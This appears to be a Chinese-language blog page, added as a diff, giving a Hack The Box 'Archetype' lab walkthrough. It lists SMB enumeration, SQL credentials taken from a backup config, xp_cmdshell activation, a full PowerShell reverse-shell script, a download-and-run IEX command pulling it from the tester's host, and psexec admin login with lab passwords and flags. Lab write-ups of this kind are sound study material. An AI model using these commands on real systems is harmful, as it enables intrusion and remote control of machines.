@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wenbuer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="HTB-Archetype WriteUpnmap 扫描nmap -sV -sC 10.10.10.27   根据上图扫描结果，靶机开放了135、139、445、1433端口  135端口为RPC，可以进行口令爆破  139端口为NetBIOS  445端口为SMB文件共享  1433端口与SQL服务有关   445端口SMB文件共享先查看SMB的共享文件 smbclient -L 10.10.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Archetype WriteUp">
+<meta property="og:url" content="https://wenbuer.github.io/2021/04/13/HTB-Archetype%20WriteUp/index.html">
+<meta property="og:site_name" content="WenBrew">
+<meta property="og:description" content="HTB-Archetype WriteUpnmap 扫描nmap -sV -sC 10.10.10.27   根据上图扫描结果，靶机开放了135、139、445、1433端口  135端口为RPC，可以进行口令爆破  139端口为NetBIOS  445端口为SMB文件共享  1433端口与SQL服务有关   445端口SMB文件共享先查看SMB的共享文件 smbclient -L 10.10.1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wenbuer.github.io/2021/04/13/images/20210313210153.png">
+<meta property="og:image" content="https://wenbuer.github.io/2021/04/13/images/20210313204721.png">
+<meta property="og:image" content="https://wenbuer.github.io/2021/04/13/images/20210313205904.png">
+<meta property="og:image" content="https://wenbuer.github.io/2021/04/13/images/20210313212722.png">
+<meta property="og:image" content="https://wenbuer.github.io/2021/04/13/images/Lily_Screenshot_1615812452.png">
+<meta property="og:image" content="https://wenbuer.github.io/2021/04/13/images/image-20210315205958962.png">
+<meta property="og:image" content="https://wenbuer.github.io/2021/04/13/images/image-20210315213821244.png">
+<meta property="og:image" content="https://wenbuer.github.io/images/image-20210413221428797.png">
+<meta property="og:image" content="https://wenbuer.github.io/2021/04/13/images/image-20210413214419239.png">
+<meta property="og:image" content="https://wenbuer.github.io/images/image-20210413215004497.png">
+<meta property="og:image" content="https://wenbuer.github.io/images/image-20210413221145501.png">
+<meta property="og:image" content="https://wenbuer.github.io/2021/04/13/images/image-20210413215944832.png">
+<meta property="article:published_time" content="2021-04-13T14:02:00.000Z">
+<meta property="article:modified_time" content="2025-09-23T14:00:42.108Z">
+<meta property="article:author" content="Wenbuer">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="Study life">
+<meta property="article:tag" content="Penetration testing">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wenbuer.github.io/2021/04/13/images/20210313210153.png">
+
+
+<link rel="canonical" href="https://wenbuer.github.io/2021/04/13/HTB-Archetype%20WriteUp/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wenbuer.github.io/2021/04/13/HTB-Archetype%20WriteUp/","path":"2021/04/13/HTB-Archetype WriteUp/","title":"HTB-Archetype WriteUp"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HTB-Archetype WriteUp | WenBrew</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">WenBrew</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">INTJ: //todo: fix personality</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HTB-Archetype-WriteUp"><span class="nav-number">1.</span> <span class="nav-text">HTB-Archetype WriteUp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap-%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.</span> <span class="nav-text">nmap 扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#445%E7%AB%AF%E5%8F%A3SMB%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB"><span class="nav-number">1.2.</span> <span class="nav-text">445端口SMB文件共享</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mssqlclient%E7%99%BB%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC"><span class="nav-number">1.3.</span> <span class="nav-text">mssqlclient登入数据库执行脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.4.</span> <span class="nav-text">提权</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Wenbuer</p>
+  <div class="site-description" itemprop="description">A no-fluff blog by Wenbuer. Code, life, and everything in between.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wenbuer.github.io/2021/04/13/HTB-Archetype%20WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Wenbuer">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WenBrew">
+      <meta itemprop="description" content="A no-fluff blog by Wenbuer. Code, life, and everything in between.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HTB-Archetype WriteUp | WenBrew">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB-Archetype WriteUp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-04-13 22:02:00" itemprop="dateCreated datePublished" datetime="2021-04-13T22:02:00+08:00">2021-04-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-09-23 22:00:42" itemprop="dateModified" datetime="2025-09-23T22:00:42+08:00">2025-09-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HTB/" itemprop="url" rel="index"><span itemprop="name">HTB</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Penetration-testing/" itemprop="url" rel="index"><span itemprop="name">Penetration testing</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="HTB-Archetype-WriteUp"><a href="#HTB-Archetype-WriteUp" class="headerlink" title="HTB-Archetype WriteUp"></a>HTB-Archetype WriteUp</h2><h3 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h3><p><code>nmap -sV -sC 10.10.10.27</code></p>
+<img src="../images/20210313210153.png" style="zoom:67%;" />
+
+<p>根据上图扫描结果，靶机开放了135、139、445、1433端口</p>
+<ul>
+<li><p>135端口为RPC，可以进行口令爆破</p>
+</li>
+<li><p>139端口为NetBIOS</p>
+</li>
+<li><p>445端口为SMB文件共享</p>
+</li>
+<li><p>1433端口与SQL服务有关</p>
+</li>
+</ul>
+<h3 id="445端口SMB文件共享"><a href="#445端口SMB文件共享" class="headerlink" title="445端口SMB文件共享"></a>445端口SMB文件共享</h3><p>先查看SMB的共享文件</p>
+<p><code>smbclient -L 10.10.10.27</code></p>
+<img src="../images/20210313204721.png" style="zoom:67%;" />
+
+<p>smb要求输入密码，但是直接按回车之后，也可以看到共享列表</p>
+<p>在图中可以看到backups为共享的对象为全体，直接访问backups文件夹</p>
+<p><code>smbclient //10.10.10.27/backups</code></p>
+<p>回车</p>
+<p>然后用<code>ls</code>查看backups文件内容</p>
+<p>用<code>get</code>获取prod.dtsConfig文件</p>
+<img src="../images/20210313205904.png" style="zoom: 67%;" />
+
+<p>prod.dtsConfig文件就下载到了我们服务器中</p>
+<img src="../images/20210313212722.png" style="zoom:67%;" />
+
+<p>在prod.dtsConfig文件中，可以找sql的User ID和Password</p>
+<p>SQL Server的身份验证方式有两种：操作系统身份验证和数据库身份验证</p>
+<p>这里的参数值是操作系统身份验证方式，ARCHETYPE为主机名，sql_svc为登录数据库的操作系统用户名</p>
+<h3 id="mssqlclient登入数据库执行脚本"><a href="#mssqlclient登入数据库执行脚本" class="headerlink" title="mssqlclient登入数据库执行脚本"></a>mssqlclient登入数据库执行脚本</h3><p>这边需要下载impacket工具</p>
+<p><code>git clone https://github.com/SecureAuthCorp/impacket</code></p>
+<p><code>cd impacket</code></p>
+<p><code>python3 setup.py install</code></p>
+<p>然后利用mssqlclient和获取到的账号密码登入数据库</p>
+<p><code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p>
+<p><code>M3g4c0rp123</code></p>
+<img src="../images/Lily_Screenshot_1615812452.png" style="zoom:67%;" />
+
+<p>登入成功之后，我们需要测试一下该账号是否具有最高的sysadmin权限</p>
+<p><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></p>
+<img src="../images/image-20210315205958962.png" style="zoom: 67%;" />
+
+<p>结果显示，该账号确实具有sysadmin的权限，接下来启用xp_cmdshell获得RCE并反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;Show Advanced Options&#x27;, 1; </span><br><span class="line">reconfigure; </span><br><span class="line">sp_configure;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>其中执行whoami的结果显示如下</p>
+<img src="../images/image-20210315213821244.png" style="zoom:67%;" />
+
+<p>说明该账户在SQL服务中具有archetype\sql_svc，但是在host上不具有任何权限</p>
+<p>创建一个shell.ps1脚本，内容如下</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.xx.xx.x&quot;</span>,xxx);<span class="variable">$stream</span> =<span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> =<span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> |<span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> =([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>
+
+<p>查一下本地ip地址</p>
+<p><code>ifconfig tun0</code></p>
+<p>得知本机在局域网内的ip为10.10.16.10</p>
+<p>修改shell.ps1脚本内ip内容为10.10.16.10，端口为443</p>
+<p>然后在shell.ps1脚本存在的文件夹下运行http服务，因为80端口有服务运行，选择在81端口上运行</p>
+<p><code>python3 -m http.server 81</code></p>
+<p>然后去另一个窗口运行nc，等待10.10.10.27的连接</p>
+<p><code>nc -nlvp 443</code></p>
+<p>接下来进sql窗口执行下列命令</p>
+<p><code>xp_cmdshell &quot;Powershell &quot; IEX(New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.10:81/shell.ps1\&quot;);&quot;</code></p>
+<p>在http和nc窗口同时得到反馈</p>
+<p><img src="/../images/image-20210413221428797.png"></p>
+<p>在<code>\user\sql_svc\desktop</code>下获取user.txt</p>
+<img src="../images/image-20210413214419239.png" style="zoom:67%;" />
+
+<p>得到user flag <code>3e7b102e78218e935bf3f4951fec21a3</code></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>前面得到的只是普通用户的账号，接下来可以通过type指令查看Powershell的历史记录文件</p>
+<p><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p>
+<p><img src="/../images/image-20210413215004497.png"></p>
+<p>这表示backups对管理员账号进行了映射，我们可以用psexec.py来取得管理员权限</p>
+<p>接下来用管理员账号<code>administrator</code>和密码<code>MEGACORP_4dm1n!!</code>进行登入</p>
+<p><img src="/../images/image-20210413221145501.png"></p>
+<p>进入到管理员桌面，取得root.txt</p>
+<img src="../images/image-20210413215944832.png" style="zoom:50%;" />
+
+<p>提交flag<code>b91ccec3305e98240082d4474b848528</code>，完成Archetype机器</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HTB/" rel="tag"># HTB</a>
+              <a href="/tags/Study-life/" rel="tag"># Study life</a>
+              <a href="/tags/Penetration-testing/" rel="tag"># Penetration testing</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/03/14/NeSE%E4%B8%99%E9%98%9F3%E6%9C%88%E6%9C%88%E8%B5%9B%E8%AE%AD%E7%BB%83/" rel="prev" title="NeSE丙队3月月赛训练">
+                  <i class="fa fa-angle-left"></i> NeSE丙队3月月赛训练
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/04/13/C++%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E2%80%94%E2%80%94%E7%8E%8B%E8%80%85%E8%8D%A3%E8%80%80APP&Line%20App/" rel="next" title="C++流量包分析——王者荣耀APP&amp;Line App">
+                  C++流量包分析——王者荣耀APP&Line App <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Wenbuer</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
